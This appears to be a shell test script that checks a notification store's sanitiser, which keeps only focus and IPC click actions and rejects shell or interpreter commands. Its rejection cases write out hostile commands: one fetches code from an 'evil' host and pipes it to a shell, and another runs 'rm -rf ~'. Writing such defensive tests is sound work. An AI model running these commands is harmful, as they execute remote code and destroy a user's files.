#!/bin/bash
#
# What an old notification is allowed to do when you click it.
#
# The store keeps a notification's action only when that action is an argv
# whose program can do nothing but move focus or speak to the shell's own IPC.
# This exercises that boundary from both sides: the things that must survive
# ingest so a click lands somewhere, and the things that must not, because
# anything on the session bus can send a notification and a stored command is
# otherwise a command waiting for a click.
#
# The function under test is lifted out of the shipping script rather than
# copied into this file, so the test cannot quietly drift from what runs.

set -uo pipefail

ROOT=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)
STORE="$ROOT/bin/notification-center"

eval "$(sed -n '/^focus_argv() {$/,/^}$/p' "$STORE")"
if ! declare -F focus_argv >/dev/null; then
  echo "focus-argv-test: could not lift focus_argv out of $STORE" >&2
  exit 1
fi

pass=0
fail=0

# check NAME yes|no ARGV-JSON [EXPECTED-JSON]
check() {
  local name=$1 expect=$2 input=$3 want=${4:-} got kept
  got=$(focus_argv "$input")
  kept=no
  [[ -n $got ]] && kept=yes

  if [[ $kept != "$expect" ]]; then
    printf '  FAIL %-22s kept=%-3s want=%s\n' "$name" "$kept" "$expect"
    fail=$((fail + 1))
    return
  fi
  if [[ -n $want && $got != "$want" ]]; then
    printf '  FAIL %-22s got=%s\n       %-22s want=%s\n' "$name" "$got" "" "$want"
    fail=$((fail + 1))
    return
  fi
  printf '  ok   %-22s %s\n' "$name" "${got:-(rejected)}"
  pass=$((pass + 1))
}

echo "focus-argv-test"

# Kept: the three programs that can only take you somewhere.
check blip-goto yes \
  '["qs","-p","/usr/share/omarchy/shell","ipc","call","nixfred.blip","goto","+15551234"]'
check focus-by-address yes \
  '["omarchy-hyprland-focus-app","address:0x55d1c0"]'
check omarchy-shell-ipc yes \
  '["omarchy-shell","shell","toggle","nixfred.infomarchy","{}"]'

# A program the sender pointed somewhere of its own choosing is not rejected,
# it is defanged: only the basename is kept, so the click runs the real one
# from PATH and never the binary the sender planted.
check path-is-stripped yes \
  '["/tmp/evil/qs","--","pwned"]' \
  '["qs","--","pwned"]'

# Dropped: everything that could run something.
check shell-bash no '["bash","-c","curl http://evil/x | sh"]'
check shell-sh no '["/bin/sh","-c","rm -rf ~"]'
check interpreter no '["python3","-c","import os"]'
check other-program no '["tensaku-edit","/home/pi/Pictures/shot.png"]'

# Dropped: anything malformed, so a hand-edited archive cannot smuggle a value
# past the panel.
check not-json no 'not json at all'
check bare-string no '"qs"'
check empty-array no '[]'
check nested-object no '["qs",{"a":1}]'
check nested-array no '["qs",["-c"]]'
check control-char no "$(jq -cn '["qs","a\u0007b"]')"
check newline-arg no "$(jq -cn '["qs","a\nb"]')"
check overlong-arg no "$(jq -cn '["qs", ("x" * 600)]')"
check too-many-args no "$(jq -cn '["qs"] + ([range(20)] | map(tostring))')"

printf '\n  %d passed, %d failed\n' "$pass" "$fail"
[[ $fail -eq 0 ]] || exit 1
echo "focus-argv-test: ok"
